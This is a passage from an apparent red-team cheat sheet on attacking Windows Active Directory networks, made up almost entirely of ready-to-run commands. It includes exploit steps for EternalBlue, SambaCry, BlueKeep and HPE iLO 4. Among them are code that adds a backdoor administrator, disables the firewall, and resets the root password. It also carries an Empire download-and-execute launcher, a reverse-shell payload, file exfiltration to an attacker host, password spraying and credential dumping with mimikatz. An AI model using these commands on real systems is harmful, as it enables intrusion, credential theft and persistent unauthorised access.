$ sudo rustscan -b 1000 -t 2000 -u 5000 -a hosts.txt -r $ports -g --no-config --scan-order "Random" > rustscan.out
```

Scan Nmap top 1000 TCP ports:

* [https://github.com/RustScan/RustScan/wiki/Config-File](https://github.com/RustScan/RustScan/wiki/Config-File)

```
$ sudo wget https://gist.github.com/snovvcrash/c7f8223cc27154555496a9cbb4650681/raw/a76a2c658370d8b823a8a38a860e4d88051b417e/rustscan-ports-top1000.toml -O /root/.rustscan.toml
$ sudo rustscan -a 10.10.13.37 --top
```

##### Naabu

* [https://github.com/projectdiscovery/naabu/releases](https://github.com/projectdiscovery/naabu/releases)

```
$ sudo naabu [-interface eth0] -iL hosts.txt -s s -rate 1000 -p - -silent [-nmap-cli 'sudo nmap -v -Pn -sVC -O -oA naabutest']
$ sudo naabu -host 10.10.13.37 -top-ports 1000
```

##### Nmap

* [https://www.infosecmatter.com/why-does-nmap-need-root-privileges/](https://www.infosecmatter.com/why-does-nmap-need-root-privileges/)

Flag `-A`:

```
nmap -A ... == nmap -sC -sV -O --traceroute ...
```

Host discovery flag:

```
nmap -sn ... == nmap -PS443 -PA80 -PE -PP ...
-PS/PA/PU/PY [portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
-PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
-PO [protocol list]: IP protocol ping
```




## AD Environment Names

Discover domain NetBIOS name:

```
PS > ([ADSI]"LDAP://megacorp.local").dc

PS > $DomainName = (Get-ADDomain).DNSRoot
PS > (Get-ADDomain -Server $DomainName).NetBIOSName
```

Discover DCs' FQDN names:

```
PS > nslookup -type=all _ldap._tcp.dc._msdcs.$env:userdnsdomain

PS > $ldapFilter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
PS > $searcher = [ADSISearcher]$ldapFilter
PS > $searcher.FindAll()
PS > $searcher.FindAll() | ForEach-Object { $_.GetDirectoryEntry() }
Or
PS > ([ADSISearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))").FindAll() |ForEach-Object { $_.GetDirectoryEntry() }

PS > [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().DomainControllers.Name

Cmd > nltest /dsgetdc:megacorp.local

PS > $DomainName = (Get-ADDomain).DNSRoot
PS > $AllDCs = Get-ADDomainController -Filter * -Server $DomainName | Select-Object Hostname,Ipv4address,isglobalcatalog,site,forest,operatingsystem

PS > $AllDCs = (Get-ADForest).GlobalCatalogs

PowerView3 > Get-DomainController | Select Name,IPAddress
```

Discover global catalog:

```
PS > Get-ADDomainController -Discover -Service "GlobalCatalog"
```

Discover MS Exchnage servers' FQDN names:

* [https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSExchangeServers](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSExchangeServers)

```
PS > Discover-PSMSExchangeServers | Select ServerName,Description | Tee-Object exch.txt
```

Discover MS SQL servers' FQDN names:

* [https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers)

```
PS > Discover-PSMSSQLServers | Select ServerName,Description | Tee-Object mssql.txt
```



### DC IPs

Query DC for forest/domain FQDN to get corresponding DC IP addresses:

```
$ dig @10.10.13.37 megacorp.local
$ dig @10.10.13.37 child.megacorp.local
```




## NetBIOS Scanning



### nbtscan

```
$ sudo nbtscan -r 10.10.10.0/24
```



### nbname (MSF)

```
msf > use auxiliary/scanner/netbios/nbname
```




## LHF



### net_api

**CVE-2008-4250, MS08-067**

Check:

```
$ sudo nmap -n -Pn -sV --script smb-vuln-ms08-067 10.10.13.37 -p139,445
Or
msf > use exploit/windows/smb/ms08_067_netapi
msf > check
```

Exploit:

```
msf > use exploit/windows/smb/ms08_067_netapi
msf > exploit
```



### EternalBlue

**CVE-2017-0144, MS17-010**


#### MSF

Check:

```
$ sudo nmap -n -Pn -sV --script smb-vuln-ms17-010 10.10.13.37 -p139,445
Or
msf > use auxiliary/scanner/smb/smb_ms17_010
```

Exploit:

```
msf > exploit/windows/smb/ms17_010_eternalblue
```


#### Manually

* [https://github.com/helviojunior/MS17-010](https://github.com/helviojunior/MS17-010)
* [https://0xdf.gitlab.io/2019/02/21/htb-legacy.html#ms-17-010](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html#ms-17-010)

Send MSF payload and execute it with `send_and_execute.py`:

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev.exe
$ python send_and_execute.py 10.10.13.38 rev.exe
```

Or just execute commands on host with `zzz_exploit.py`:

```python
def smb_pwn(conn, arch):
	...
	service_exec(conn, r'cmd /c net user snovvcrash Passw0rd! /add')
	service_exec(conn, r'cmd /c net localgroup administrators snovvcrash /add')
	service_exec(conn, r'cmd /c netsh firewall set opmode disable')
```



### SambaCry

**CVE-2017-7494** (Samba 3.5.0 < 4.4.14/4.5.10/4.6.4)


#### MSF

```
msf > use exploit/linux/samba/is_known_pipename
msf > set SMB::AlwaysEncrypt false
msf > set SMB::ProtocolVersion 1
```


#### Manually

* [https://github.com/joxeankoret/CVE-2017-7494](https://github.com/joxeankoret/CVE-2017-7494)

Compile `.so` SUID shared library:

```c
// gcc -shared -fPIC -o pwn.so pwn.c

 #include <stdio.h>
 #include <stdlib.h>

static void pwn() __attribute__((constructor));

void pwn() {
	setresuid(0,0,0);
	system("echo 'root:Passw0rd!'|chpasswd");
}
```

Get real share path on the target's filesystem:

```
$ rpcclient -U'%' -c'netsharegetinfo ShareName' 10.10.13.37
path:    /home/snovvcrash/sharename
```

Upload `pwn.so` to target and then run the exploit:

```
$ ./exploit.py -t 10.10.13.37 -e pwn.so -s ShareName -r /home/snovvcrash/sharename/pwn.so -u anonymous -p ''
```



### BlueKeep

**CVE-2019-0708**

Check:

```
msf > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```

Exploit:

```
msf > exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```




## Generate Wordlists



### hashcat

Potentially valid usernames, `John Doe` as an example:

* [https://activedirectorypro.com/active-directory-user-naming-convention/](https://activedirectorypro.com/active-directory-user-naming-convention/)

```
$ cat << EOF >> passwords.txt
johndoe
jdoe
j.doe
doe
EOF
```

Common usernames:

```
$ cat << EOF >> passwords.txt
admin
administrator
root
guest
sa
changeme
password
EOF
```

Common patterns:

```
$ cat << EOF >> passwords.txt
January
February
March
April
May
June
July
August
September
October
November
December
Autumn
Fall
Spring
Winter
Summer
password
Password
P@ssw0rd
secret
Secret
S3cret
EOF
```

Add year and exclamation point to the end of each password:

```
$ for i in $(cat passwords.txt); do echo "${i}"; echo "${i}\!"; echo "${i}2020"; echo "${i}2020\!"; done > t
$ cp t passwords.txt
```

Mutate the wordlist with hashcat rules:

```
$ hashcat --force --stdout passwords.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule |sort -u |awk 'length($0) > 7' > t
$ cp t passwords.txt
```



### kwprocessor

* [https://github.com/hashcat/kwprocessor](https://github.com/hashcat/kwprocessor)

```
$ ./kwp basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route > passwords.txt
```



### cewl

```
$ cewl -d 5 -m 5 -w passwords.txt --with-numbers --email_file emails.txt http://megacorp.local/somedir/logs/html/index.htm
```




## Tools



### rpcclient

```
$ rpcclient -U '' -N 127.0.0.1
$ rpcclient -U 'snovvcrash%Passw0rd!' 127.0.0.1

rpcclient $> enumdomusers
rpcclient $> enumdomgroups
```



### enum4linux

```
$ enum4linux -v -a 127.0.0.1 | tee enum4linux.out
```



### nullinux

* [https://github.com/m8r0wn/nullinux](https://github.com/m8r0wn/nullinux)

```
$ git clone https://github.com/m8r0wn/nullinux ~/tools/nullinux && cd ~/tools/nullinux && sudo bash setup.sh && ln -s ~/tools/nullinux/nullinux.py /usr/local/bin/nullinux.py && cd -
$ nullinux.py 127.0.0.1
```



### kerbrute

* [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)

```
$ ./kerbrute -v --delay 100 -d megacorp.local -o kerbrute-passwordspray-123456.log passwordspray users.txt '123456'
```



### DomainPasswordSpray

* [https://github.com/dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)

```
PS > Invoke-DomainPasswordSpray -UserList .\users.txt -Domain megacorp.local -Password 'Passw0rd!' -OutFile spray-results.txt
```



### crowbar

* [https://github.com/galkan/crowbar](https://github.com/galkan/crowbar)


#### RDP

```
$ crowbar -b rdp -s 192.168.1.0/24 -u snovvcrash -c 'Passw0rd!' -l ~/ws/log/crowbar.log -o ~/ws/log/crowbar.out
```



### impacket

* [https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)

```
$ git clone https://github.com/SecureAuthCorp/impacket ~/tools/impacket && cd ~/tools/impacket
$ pip3 install .
```


#### lookupsid.py

```
$ lookupsid.py MEGACORP/snovvcrash:'Passw0rd!'@127.0.0.1 20000 | tee ~/ws/log/lookupsid.out
$ cat ~/ws/log/lookupsid.out | grep SidTypeUser | grep -v -e '\$' -e HealthMailbox | awk -F'\' '{print $2}' | awk '{print $1}' | perl -nle 'print if m{^[[:ascii:]]+$}' > ~/ws/enum/allusers.txt
```



### adidnsdump

* [https://github.com/dirkjanm/adidnsdump](https://github.com/dirkjanm/adidnsdump)

```
$ cd ~/ws/enum/
$ adidnsdump -u 'megacorp.local\snovvcrash' -p 'Passw0rd!' DC01.megacorp.local
$ mv records.csv adidnsdump.csv
```

Check with ldapsearch:

```
$ ldapsearch -H ldap://10.10.13.37:389 -x -D 'CN=snovvcrash,CN=Users,DC=megacorp,DC=local' -w 'Passw0rd!' -s sub -b 'DC=megacorp.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=megacorp,DC=local' '(objectClass=*)' dnsRecord dNSTombstoned name
```



### CrackMapExec

Install bleeding-edge:

```
$ git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec ~/tools/CrackMapExec && cd ~/tools/CrackMapExec
$ poetry install
$ poetry run crackmapexec -h
Or
$ pipx install crackmapexec
$ cme -h
```

Use:

```
$ cme smb 127.0.0.1
$ cme smb 127.0.0.1 -u anonymous -p '' --shares
$ cme smb 127.0.0.1 -u '' -p '' -d WORKGROUP --shares
$ cme smb 127.0.0.1 -u nullinux_users.txt -p passwords.txt --shares [--no-bruteforce] [--continue-on-success]
$ cme smb 127.0.0.1 -u snovvcrash -p 'Passw0rd!' --spider-folder 'E\$' --pattern s3cret
$ cme smb 127.0.0.1 -u j.doe -p 'Passw0rd!' -d 'CORP' --spider Users --pattern '.'
$ cme smb 127.0.0.1 -u snovvcrash -p '' --local-auth --sam
$ cme smb 127.0.0.1 -u snovvcrash -p '' -M spider_plus
$ cme smb 127.0.0.1 -u snovvcrash -p '' -M mimikatz
$ cme smb 127.0.0.1 -u snovvcrash -p '' -M lsassy
```



### Empire

* [https://github.com/BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire)

Install:

```
$ git clone https://github.com/BC-SECURITY/Empire ~/tools/Empire && cd ~/tools/Empire
$ sudo STAGING_KEY=`echo 'H4ckTh3Pl4net!' | md5sum | cut -d' ' -f1` ./setup/install.sh
$ sudo poetry install
$ echo $'#!/usr/bin/env bash\n\nsudo poetry run python empire' > ~/tools/Empire/run_empire.sh
$ chmod +x ~/tools/Empire/run_empire.sh
```

Pwsh launcher string:

```
PS > powershell -NoP -sta -NonI -W Hidden -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.37/launcher.ps1')"
```



### Bloodhound


#### Setup

```
$ sudo apt install neo4j
$ sudo mkdir -p /usr/share/neo4j/logs/
$ sudo neo4j console
...change default password at localhost:7474...
$ sudo neo4j start
$ wget https://github.com/BloodHoundAD/BloodHound/releases/latest
$ unzip BloodHound-linux-x64.zip && rm BloodHound-linux-x64.zip && cd BloodHound-linux-x64
$ sudo ./BloodHound --no-sandbox
Or
$ sudo chown root:root chrome-sandbox
$ sudo chmod 4755 chrome-sandbox
$ ./BloodHound
```


#### Collectors

##### SharpHound.ps1

```
PS > Invoke-Bloodhound -CollectionMethod All,GPOLocalGroup -Domain megacorp.local -LDAPUser snovvcrash -LDAPPass 'Passw0rd!'
PS > Invoke-Bloodhound -CollectionMethod SessionLoop -Domain megacorp.local
```

##### SharpHound.exe

```
PS > .\SharpHound.exe -c All,GPOLocalGroup -d megacorp.local --ldapusername snovvcrash --ldappassword 'Passw0rd!'
PS > .\SharpHound.exe -c SessionLoop -d megacorp.local
```


#### Cypher

* [https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)

Show percentage of collected user sessions:

* [https://youtu.be/q86VgM2Tafc](https://youtu.be/q86VgM2Tafc)

```
 # http://localhost:7474/browser/
MATCH (u1:User)
WITH COUNT(u1) AS totalUsers
MATCH (c:Computer)-[r:HasSession]->(u2:User)
WITH totalUsers, COUNT(DISTINCT(u2)) AS usersWithSessions
RETURN totalUsers, usersWithSessions, 100 * usersWithSessions / totalUsers AS percetange
```


#### BloodHound.py

* [https://github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)

```
$ cd ~/ws/enum/bloodhound/bloodhound.py/
$ bloodhound-python -c All,LoggedOn -u snovvcrash -p 'Passw0rd!' -d megacorp.local -ns 127.0.0.1
```



### dementor.py

* [https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc](https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc)

```
$ ./dementor.py -d megacorp.local -u snovvcrash -p 'Passw0rd!' 10.10.13.37 DC01.megacorp.local
```



### printerbug.py

* [https://https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)

```
$ ./printerbug.py megacorp.local/snovvcrash:'Passw0rd!'@DC01.megacorp.local 10.10.13.37
```



### cve-2019-1040-scanner

* [https://github.com/fox-it/cve-2019-1040-scanner/blob/master/scan.py](https://github.com/fox-it/cve-2019-1040-scanner/blob/master/scan.py)

```
$ ./scan.py MEGACORP/snovvcrash:'Passw0rd!'@10.10.13.37
$ ./scan.py -target-file DCs.txt MEGACORP/snovvcrash:'Passw0rd!'
```



### spraykatz

* [https://github.com/aas-n/spraykatz](https://github.com/aas-n/spraykatz)

```
$ ./spraykatz.py -u snovvcrash -p 'Passw0rd!' -t 10.10.13.37,10.10.13.38,10.10.13.39
```



### PowerView

* [https://www.harmj0y.net/blog/powershell/make-powerview-great-again/](https://www.harmj0y.net/blog/powershell/make-powerview-great-again/)
* [https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
* [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
* [PowerView2.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1)
* [PowerView3.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
* [PowerView3.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1#L5907-L6122) [(New-GPOImmediateTask)](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [PowerView4.ps1](https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1) [(ZeroDayLab)](https://exploit.ph/powerview.html)

```
PowerView3 > Get-DomainComputer -Properties Name | Resolve-IPAddress
```



### PowerUp

* [https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
* [https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf)
* [https://recipeforroot.com/advanced-powerup-ps1-usage/](https://recipeforroot.com/advanced-powerup-ps1-usage/)

```
PS > Invoke-PrivescAudit
```



### PowerUpSQL

* [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

```
PS > Get-SQLInstanceDomain
PS > Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Threads 10 -UserName sa -Password 'Passw0rd!' -Verbose
PS > Invoke-SQLOSCmd -UserName sa -Password 'Passw0rd!' -Instance sqlsrv01.megacorp.local -Command whoami
PS > Invoke-SQLAudit -Instance WEB01 -UserName sa -Password 'Passw0rd!' -Verbose
```



### Windows-Exploit-Suggester

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

```
$ python -u windows-exploit-suggester.py -d 2020-09-02-mssb.xls -i systeminfo.txt --ostext 'windows 10 64-bit' --hotfixes hotfixes.txt | tee wes.out
```



### JAWS

* [https://github.com/411Hall/JAWS/blob/master/jaws-enum.ps1](https://github.com/411Hall/JAWS/blob/master/jaws-enum.ps1)

```
PS > .\jaws-enum.ps1 -OutputFileName jaws-enum.txt
```



### winPEAS

* [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe)



### PrivescCheck

* [https://github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)

```
PS > powershell.exe -exec bypass -c ". .\privesccheck.ps1; Invoke-PrivescCheck -Extended | Tee-Object privesccheck-out.txt"
```



### Seatbelt

* [https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)
* [https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1)

```
PS > .\Seatbelt.exe CredEnum
PS > .\Seatbelt.exe ScheduledTasks
PS > Invoke-Seatbelt -Command "-group=all"
```




## Unsorted

* [https://www.infosecmatter.com/powershell-commands-for-pentesters/](https://www.infosecmatter.com/powershell-commands-for-pentesters/)

```
PS > systeminfo
PS > whoami /priv (whoami /all)
PS > gci . -recurse -file -ea SilentlyContinue | select fullname
PS > gci "$env:userprofile" -recurse -file -ea SilentlyContinue | select fullname
PS > net user
PS > net user /domain
PS > net user j.doe /domain
PS > net accounts
PS > net accounts /domain
PS > net localgroup Administrators
PS > net group /domain
PS > net group "Domain admins" /domain
PS > net group "Enterprise admins" /domain
PS > cmdkey /list
PS > wmic product get name
PS > wmic service get name,displayname,pathname,startmode
PS > get-process
PS > tasklist /SVC
PS > net start
PS > netstat -ano | findstr LIST
PS > ipconfig /all
PS > route print
PS > dir -force c:\
PS > cmd /c "reg query HKLM\SYSTEM\CurrentControlSet\Services\NPCAP"
PS > (wmic os get OSArchitecture)[2]
PS > [Environment]::Is64BitOperatingSystem
PS > [Environment]::Is64BitProcess
PS > $ExecutionContext.SessionState.LanguageMode
PS > [System.Net.Dns]::GetHostAddresses('hostname') | % {$_.IPAddressToString}
PS > vssadmin list shadows (or run post/windows/manage/vss_list with MSF)
```

Common AV process names:

| Process Name |          Vendor/Product          |
|--------------|----------------------------------|
| avp.exe      | Kaspersky Internet Security      |
| cpda.exe     | End Point Security (Check Point) |
| MsMpEng.exe  | Windows Defender                 |
| ntrtscan.exe | Trend Micro OfficeScan           |
| tmlisten.exe | Trend Micro OfficeScan           |

```
PS > gc .\100-hosts.txt | % {gwmi -Query "select * from Win32_Process" -ComputerName $_ | ? {$_.Caption -in "avp.exe","cpda.exe","MsMpEng.exe","ntrtscan.exe","tmlisten.exe"} | select ProcessName,PSComputerName}
```

Identify Microsoft.NET version:

```
PS > cd C:\Windows\Microsoft.NET\Framework64\
PS > ls
PS > cd .\v4.0.30319\
PS > Get-Item .\clr.dll | Fl
Or
PS > [System.Diagnostics.FileVersionInfo]::GetVersionInfo($(Get-Item .\clr.dll)).FileVersion
```





# ExecutionPolicy Bypass

* [https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
* [https://bestestredteam.com/2019/01/27/powershell-execution-policy-bypass/](https://bestestredteam.com/2019/01/27/powershell-execution-policy-bypass/)





# File Transfer




## Linux

* [https://snovvcrash.github.io/2018/10/11/simple-http-servers.html](https://snovvcrash.github.io/2018/10/11/simple-http-servers.html)




## Windows



### Base64

Local file to base64:

```
Cmd > certutil -encode <FILE_TO_ENCODE> C:\Windows\Temp\encoded.b64
Cmd > type C:\Windows\Temp\encoded.b64
```

Local string to base64 and POST:

```
PS > $str = cmd /c net user /domain
PS > $base64str = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
PS > IWR -Uri http://127.0.0.1/msg -Method POST -Body $base64str
```



### Hex

Compress a binary file and transfer it to Windows by copy-pasting commands into the console:

```
$ upx -9 file.exe
$ exe2hex -x file.exe -p file.cmd
$ cat file.cmd | xclip -i -sel c
```



### PowerShell

PowerShell upload file:

```
PS > (New-Object Net.WebClient).UploadFile("http://10.10.13.37/file.txt", "file.txt")
```

PowerShell auto detect proxy, download file from remote HTTP server and run it:

```
$proxyAddr=(Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings").ProxyServer;$proxy=New-Object System.Net.WebProxy;$proxy.Address=$proxyAddr;$proxy.UseDefaultCredentials=$true;$client=New-Object System.Net.WebClient;$client.Proxy=$proxy;$client.DownloadFile("http://10.10.13.37/met.exe","$env:userprofile\music\met.exe");$exec=New-Object -com shell.application;$exec.shellexecute("$env:userprofile\music\met.exe")
```

PowerShell manually set proxy and upload file to remote HTTP server:

```
$client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("http://proxy.megacorp.local:3128",$true);$creds=New-Object Net.NetworkCredential("snovvcrash","Passw0rd!","megacorp.local");$creds=$creds.GetCredential("http://proxy.megacorp.local","3128","KERBEROS");$proxy.Credentials=$creds;$client.Proxy=$proxy;$client.UploadFile("http://10.10.13.37/results.txt","results.txt")
```




## Linux2Linux



### /dev/tcp

```
 # Sender:
root@kali:$ tar -zcvf folder.tar.gz folder
root@kali:$ nc -w3 -lvnp 1234 < folder.tar.gz
 # Recipient:
www-data@victim:$ bash -c 'cat < /dev/tcp/127.0.0.1/1234 > .folder.tar.gz'
www-data@victim:$ tar -zxvf .folder.tar.gz

 # Recipient:
root@kali:$ nc -w3 -lvnp 1234 > file.txt
 # Sender:
www-data@victim:$ bash -c 'cat < file.txt > /dev/tcp/127.0.0.1/1234'
```




## Linux2Windows

* [https://blog.ropnop.com/transferring-files-from-kali-to-windows/](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)



### Base64

Full base64 file transfer from Linux to Windows:

```
$ base64 -w0 tunnel.aspx; echo
...BASE64_CONTENTS...
PS > Add-Content -Encoding UTF8 tunnel.b64 "<BASE64_CONTENTS>" -NoNewLine
PS > $data = Get-Content -Raw tunnel.b64
PS > [IO.File]::WriteAllBytes("C:\inetpub\wwwroot\uploads\tunnel.aspx", [Convert]::FromBase64String($data))
```



### SMB


#### smbserver.py

Start SMB server:

```
$ sudo smbserver.py -smb2support files `pwd`
```

Mount SMB in Windows with `net use`:

```
$ sudo smbserver.py -username snovvcrash -password 'Passw0rd!' -smb2support share `pwd`
PS > net use Z: \\10.10.14.16\share
PS > net use Z: \\10.10.14.16\share /u:snovvcrash 'Passw0rd!'
```

Mount SMB in Windows with `New-PSDrive`:

```
$ sudo smbserver.py -username snovvcrash -password 'Passw0rd!' -smb2support share `pwd`
PS > $pass = 'Passw0rd!' | ConvertTo-SecureString -AsPlainText -Force
PS > $cred = New-Object System.Management.Automation.PSCredential('snovvcrash', $pass)
Or
PS > $cred = New-Object System.Management.Automation.PSCredential('snovvcrash', $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force))
PS > New-PSDrive -name Z -root \\10.10.14.16\share -Credential $cred -PSProvider 'filesystem'
PS > cd Z:
```


#### net share

```
Cmd > net share pentest=c:\smb_pentest /GRANT:"Anonymous Logon,FULL" /GRANT:"Everyone,FULL"
Or
Cmd > net share pentest=c:\smb_pentest /GRANT:"Administrator,FULL"
Cmd > net share pentest /delete
```



### FTP

```
$ python -m pip install pyftpdlib
$ python -m pyftpdlib -Dwp 2121
Cmd > cd C:\Windows\System32\spool\drivers\color
Cmd > echo 'open 127.0.0.1 2121' > ftp.txt
Cmd > echo 'user anonymous' >> ftp.txt
Cmd > echo 'anonymous' >> ftp.txt
Cmd > echo 'binary' >> ftp.txt
Cmd > echo 'put file.bin' >> ftp.txt
Cmd > echo 'bye' >> ftp.txt
Cmd > ftp -v -n -s:ftp.txt
```



### TFTP

Send `file.exe` from Windows to Linux (TFTP client must be [enabled](https://teckangaroo.com/enable-tftp-windows-10/) on Windows):

```
$ sudo atftpd --daemon --bind 10.10.13.37 --port 69 ./tftp
Cmd > tftp -i 10.10.13.37 put file.exe
$ sudo pkill atftpd
```





# Information Gathering




## Google Dorks

```
site:megacorp.com filetype:(doc | docx | docm | xls | xlsx | xlsm | ppt | pptx | pptm | pdf | rtf | odt | xml | txt)
site:megacorp.com ext:(config | cfg | ini | log | bak | backup | dat)
site:megacorp.com ext:(php | asp | aspx)
"@megacorp.com" email e-mail
"megacorp.com" site:ideone.com | site:codebeautify.org | site:codeshare.io | site:codepen.io | site:repl.it | site:justpaste.it | site:pastebin.com | site:jsfiddle.net | site:trello.com
```





# IPMI

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)
* [https://habr.com/ru/company/selectel/blog/439834/](https://habr.com/ru/company/selectel/blog/439834/)




## Discovery

```
msf > use auxiliary/scanner/ipmi/ipmi_version
```




## Dump Hashes

**CVE-2013-4786**

```
msf > use scanner/ipmi/ipmi_dumphashes
```




## Cipher Zero

**CVE-2013-4805**

Discover with MSF:

```
msf > use scanner/ipmi/ipmi/ipmi_cipher_zero
```

Guess existing admin username. If `ADMIN` username is correct, the `list` command will succeed (password doesn't matter):

```
$ sudo apt install ipmitool
$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U ADMIN -P DummyPassw0rd user list
```

Add new admin user (only existing admin username is needed):

```
$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U ADMIN -P DummyPassw0rd user set name <ID> snovvcrash
$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U ADMIN -P DummyPassw0rd user set password <ID> 'Passw0rd!'
$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U ADMIN -P DummyPassw0rd user priv <ID> 4
$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U ADMIN -P DummyPassw0rd user enable <ID>
```




## Anonymous Authentication

Can be discovered with MSF `ipmi_dumphashes` but also with ipmitool:

```
$ ipmitool -I lanplus -H 127.0.0.1 -U '' -P '' user list
```

Change password of a named user account:

```
$ ipmitool -I lanplus -H 127.0.0.1 -U '' -P '' user set password <ID> 'Passw0rd!'
```




## HPE iLO 4

* [https://codeby.net/threads/poluchaem-dostup-k-hp-ilo.63224/](https://codeby.net/threads/poluchaem-dostup-k-hp-ilo.63224/)
* [https://github.com/airbus-seclab/ilo4_toolbox](https://github.com/airbus-seclab/ilo4_toolbox)



### Add Admin User

**CVE-2017-12542**

Exploit with Python:

* [https://www.exploit-db.com/exploits/44005](https://www.exploit-db.com/exploits/44005)

```
$ ./44005.py -t -e -u snovvcrash -p 'Passw0rd!' 127.0.0.1
```

Exploit with MSF:

```
msf > use auxiliary/admin/hp/hp_ilo_create_admin_account
```





# Java RMI




## Enumerate

Check if class loader is enabled:

```
msf > use auxiliary/scanner/misc/java_rmi_server
```

Dump registry with MSF:

```
msf > use use auxiliary/gather/java_rmi_registry
```

Dump registry with Nmap:

```
$ sudo nmap -sV --script "rmi-dumpregistry or rmi-vuln-classloader" 10.10.13.37 -p1098
```




## BaRMIe

* [https://github.com/NickstaDB/BaRMIe](https://github.com/NickstaDB/BaRMIe)

```
$ java -jar BaRMIe.jar -enum 10.10.13.37 1098
$ java -jar BaRMIe.jar -attack 10.10.13.37 1098
```




## remote-method-guesser

* [https://github.com/qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

```
$ java -jar rmg-3.0.0-jar-with-dependencies.jar 10.10.13.37 1098 enum
```




## rmiscout

* [https://github.com/BishopFox/rmiscout](https://github.com/BishopFox/rmiscout)





# Kali




## Configure

Mix settings list (both for hardware install and virtualization):

```
[VM] Disable screen lock (Power Manager -> Display, Security -> OFF)
[VM] Configure networks (+ remember to configure VBox DHCP first)
[All] Update && Upgrade (+ change /etc/apt/sources.list to HTTPS if getting "403 Forbidden" because of AV)
	$ sudo apt update && sudo upgrade -y
	$ sudo reboot
[VM] Install guest additions
	* Insert Guest Additions CD image and open terminal there
	$ cp /media/cdrom0/VBoxLinuxAdditions.run ~/Desktop && chmod 755 ~/Desktop/VBoxLinuxAdditions.run && sudo ~/Desktop/VBoxLinuxAdditions.run
	$ sudo reboot
	$ rm ~/Desktop/VBoxLinuxAdditions.run && sudo eject
[ALL] Manage users
	* Enable root or create new user
		SWITCH {
			CASE (root):
				$ sudo -i
				$ passwd root
				* Re-login as root
			CASE (non-root):
				$ sudo useradd -m -s /bin/bash -u 1337 snovvcrash
				$ sudo passwd snovvcrash
				$ sudo usermod -aG sudo snovvcrash
